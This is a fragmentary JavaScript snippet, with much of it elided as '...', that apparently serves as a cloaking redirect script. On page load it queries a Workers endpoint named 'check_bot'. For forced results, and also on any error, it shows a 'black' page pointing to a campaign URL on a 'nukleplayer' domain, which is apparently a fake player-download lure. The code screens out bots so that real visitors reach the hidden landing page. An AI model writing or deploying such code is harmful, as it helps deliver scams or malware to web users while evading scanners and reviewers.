...
window.addEventListener('DOMContentLoaded', () => {
  ...
  const workerURL = 'https://noisy-sound-2375.mendez-eleuterio-1976.workers.dev/loader/api/check_bot' + qs;
  ...
  fetch(workerURL)
    ...
    .then(res => {
      ...
      if (force) {
        ...
        showBlack((res.campaign || 'https://app.get-nukleplayer.com/j5LQkNYC') + qs);
        return;
      }
    ...
    .catch(e => {
      ...
      showBlack('https://app.get-nukleplayer.com/j5LQkNYC' + (location.search || ''));
    });
});